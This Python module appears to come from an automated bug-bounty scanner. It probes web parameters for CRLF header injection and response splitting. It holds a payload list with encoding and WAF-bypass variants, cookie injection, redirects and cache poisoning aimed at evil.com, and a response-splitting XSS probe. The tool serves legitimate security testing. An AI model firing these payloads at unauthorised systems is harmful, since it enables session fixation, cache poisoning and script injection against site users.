"""CRLF Injection Scanner — HTTP header injection and response splitting.

Covers:
  - Standard CRLF (%0d%0a)
  - Double/triple URL encoding
  - Unicode CRLF variants
  - Header injection (Set-Cookie, Location, X-Forwarded)
  - Response splitting (injecting body content)
  - POST body and header injection
  - Cache poisoning vectors
  - WAF bypass encodings
"""
from __future__ import annotations
import asyncio, re
from typing import List, Optional
from core.base_scanner import BaseScanner
from core.models import Finding, ScanState
from config.settings import Severity

CRLF_PAYLOADS = [
    # Standard CRLF
    ("%0d%0aInjected-Header:BugBountyAgent", "basic CRLF"),
    ("%0d%0aSet-Cookie:crlf=injected", "cookie injection"),
    ("%0d%0aLocation:%20https://evil.com", "redirect via CRLF"),
    ("%0D%0AX-Injected:true", "header injection (caps)"),
    # Newline only (some servers accept just LF)
    ("%0aInjected-Header:BugBountyAgent", "LF only"),
    ("%0dInjected-Header:BugBountyAgent", "CR only"),
    # Double URL encoding
    ("%250d%250aInjected-Header:BugBountyAgent", "double-encoded"),
    ("%%0d0d%%0a0aInjected-Header:BugBountyAgent", "partial double"),
    # Triple encoding
    ("%25250d%25250aInjected-Header:BugBountyAgent", "triple-encoded"),
    # Unicode CRLF
    ("%E5%98%8A%E5%98%8DInjected-Header:BugBountyAgent", "Unicode CRLF"),
    ("%u000D%u000AInjected-Header:BugBountyAgent", "Unicode escape"),
    # Hash + CRLF (bypass path-based filters)
    ("%23%0d%0aInjected-Header:BugBountyAgent", "hash + CRLF"),
    # Response splitting
    ("%0d%0a%0d%0a<script>alert(1)</script>", "response splitting XSS"),
    ("%0d%0aContent-Length:0%0d%0a%0d%0aHTTP/1.1 200 OK", "full response splitting"),
    ("%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>injected</h1>", "content-type override"),
    # Tab-based (some servers)
    ("\r\nX-Injected: true", "raw CRLF"),
    ("\r\nSet-Cookie: crlf=injected", "raw cookie injection"),
    # Cache poisoning
    ("%0d%0aX-Forwarded-Host:evil.com", "cache poisoning"),
    ("%0d%0aX-Forwarded-For:127.0.0.1", "IP spoofing via CRLF"),
]

CRLF_CANARY = "BugBountyAgent"
INJECTED_COOKIE = "crlf=injected"
INJECTED_HEADER_NAMES = ["injected-header", "x-injected", "set-cookie", "location",
                          "content-length", "content-type", "x-forwarded-host", "x-forwarded-for"]

REMEDIATION = (
    "Sanitize all user input used in HTTP headers by stripping or rejecting "
    "CR (\\r) and LF (\\n) characters. Use framework-provided response header "
    "APIs that auto-sanitize. URL-encode output placed in header values."
)


class CRLFInjectionScanner(BaseScanner):
    name = "crlf_injection"
    description = "Detects CRLF injection, HTTP header injection, and response splitting"
    tags = ["injection", "crlf", "owasp-a03"]

    async def run(self, state: ScanState) -> List[Finding]:
        tasks = []
        seen = set()

        for url, params in state.target.discovered_params.items():
            for param in params:
                for payload, desc in CRLF_PAYLOADS:
                    # GET query injection
                    tasks.append(self._test(url, param, payload, desc, "GET", "query"))
                # POST body (top payloads only)
                for payload, desc in CRLF_PAYLOADS[:8]:
                    tasks.append(self._test(url, param, payload, desc, "POST", "body"))

        results = await asyncio.gather(*tasks, return_exceptions=True)
        findings = []
        for r in results:
            if isinstance(r, Finding):
                key = (r.url, r.parameter, r.vuln_type)
                if key not in seen:
                    seen.add(key)
                    findings.append(r)
        return findings

    async def _test(self, url, param, payload, desc, method, inject_in) -> Optional[Finding]:
        resp, raw_req = await self.test_payload(url, method, param, payload, inject_in=inject_in)
        if not resp:
            return None

        # Check response headers for injected content
        headers_str = "\r\n".join(f"{k}: {v}" for k, v in resp.headers.items())
        headers_lower = headers_str.lower()

        # Check for canary in headers
        if CRLF_CANARY.lower() in headers_lower:
            severity = Severity.HIGH
            vuln_sub = "crlf_header_injection"
            if "set-cookie" in headers_lower or "location" in headers_lower:
                severity = Severity.CRITICAL
                vuln_sub = "crlf_session_fixation" if "set-cookie" in headers_lower else "crlf_redirect"

            return self.make_finding(
                title=f"CRLF Injection ({desc}) in '{param}'",
                vuln_type=vuln_sub, severity=severity,
                url=url, parameter=param, method=method, payload=payload,
                evidence=f"Injected header in response: {headers_str[:200]}",
                request=raw_req, response=resp.text[:300],
                cwe_id="CWE-113", owasp_category="A03:2021 - Injection",
                description=(
                    f"Parameter '{param}' ({method} {inject_in}) allows CRLF injection ({desc}). "
                    + ("Session fixation via Set-Cookie injection." if "set-cookie" in headers_lower
                       else "HTTP header injection into response.")
                ),
                remediation=REMEDIATION,
                poc_steps=[
                    f"1. {method} {url}",
                    f"2. Set {param}={payload} (in {inject_in})",
                    "3. Observe injected header in HTTP response",
                    "4. Escalate: session fixation, cache poisoning, XSS via response splitting",
                ],
            )

        # Check for injected cookie specifically
        if INJECTED_COOKIE in headers_lower:
            return self.make_finding(
                title=f"CRLF Cookie Injection ({desc}) in '{param}'",
                vuln_type="crlf_session_fixation", severity=Severity.HIGH,
                url=url, parameter=param, method=method, payload=payload,
                evidence=f"Injected Set-Cookie header: {INJECTED_COOKIE}",
                request=raw_req, cwe_id="CWE-113",
                owasp_category="A03:2021 - Injection",
                description=f"CRLF injection sets arbitrary cookies — session fixation possible.",
                remediation=REMEDIATION,
            )

        # Check for response splitting (body injection)
        if "<script>" in resp.text and "alert(1)" in resp.text:
            return self.make_finding(
                title=f"HTTP Response Splitting ({desc}) via '{param}'",
                vuln_type="response_splitting", severity=Severity.HIGH,
                url=url, parameter=param, method=method, payload=payload,
                evidence="CRLF + script injection in response body",
                request=raw_req, response=resp.text[:500],
                cwe_id="CWE-113", owasp_category="A03:2021 - Injection",
                description="Full HTTP response splitting — arbitrary body injection.",
                remediation=REMEDIATION,
            )

        # Check for injected HTML in body (content-type override case)
        if "<h1>injected</h1>" in resp.text:
            return self.make_finding(
                title=f"Response Splitting (HTML injection) via '{param}'",
                vuln_type="response_splitting", severity=Severity.HIGH,
                url=url, parameter=param, method=method, payload=payload,
                evidence="Injected HTML appeared in response body",
                request=raw_req, response=resp.text[:500],
                cwe_id="CWE-113", owasp_category="A03:2021 - Injection",
                description="Response splitting with content-type override allows arbitrary HTML injection.",
                remediation=REMEDIATION,
            )

        return None
